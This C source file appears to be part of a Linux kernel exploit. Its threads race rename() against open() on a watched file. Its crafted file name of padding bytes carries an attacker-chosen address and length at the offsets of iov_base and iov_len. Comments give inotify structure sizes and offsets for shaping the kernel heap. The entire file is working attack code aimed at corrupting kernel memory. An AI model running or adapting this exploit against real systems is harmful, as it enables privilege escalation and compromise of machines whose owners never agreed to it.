#include "conf.h"

extern volatile int stop;


void *t_open(void *args __attribute__((unused))) {
    for (int i=0 ; i<10000 && !stop ; i++) {
        open(DIR_TEST "/" FILE_SHORT_NAME, O_RDWR);
    }

    pthread_exit(NULL);
}

void *t_rename(void *_args) {
    setvbuf(stdout, NULL, _IONBF, 0);

    uint64_t *args = (uint64_t *)_args;
    uint64_t addr = args[0];
    size_t size = args[1];
    size_t dpos = strlen(DIR_TEST "/");
    uint8_t new_name[0x400];

    memset(new_name, 0, 0x400);
    strcpy(new_name, DIR_TEST "/");
    memset(new_name+dpos, 'C', 0x94);
    memcpy(new_name+dpos+0x94, &addr, 8);    // iov_base
    memcpy(new_name+dpos+0x9C, &size, 8);    // iov_len

    if (strlen(new_name+9) < 0x9D) {
        puts("[!] NULL byte detected in the given address.");
        exit(EXIT_FAILURE);
    }

    // kmalloc size: sizeof(struct inotify_event_info) + strlen(file_name) + 1
    //             > 0x31 + strlen(file_name)
    // offsetof(struct inotify_event_info, name) = 0x2C

    for (int i=0 ; i<1000 && !stop ; i++) {
        if (rename(DIR_TEST "/" FILE_SHORT_NAME, new_name) < 0) {
            perror("rename");
        }

        if (rename(new_name, DIR_TEST "/" FILE_SHORT_NAME) < 0) {
            perror("rename");
        }
    }

    pthread_exit(NULL);
}

void *t_rename_open(void *_args) {
    setvbuf(stdout, NULL, _IONBF, 0);

    pthread_t thread1, thread2;
    int r;

    if ((r = pthread_create(&thread1, NULL, t_rename, _args))) {
        fprintf(stderr, "error: pthread_create() returns %d\n", r);
        exit(EXIT_FAILURE);
    }

    if ((r = pthread_create(&thread2, NULL, t_open, NULL))) {
        fprintf(stderr, "error: pthread_create() returns %d\n", r);
        exit(EXIT_FAILURE);
    }

    pthread_join(thread1, NULL);
    pthread_join(thread2, NULL);

    pthread_exit(NULL);
}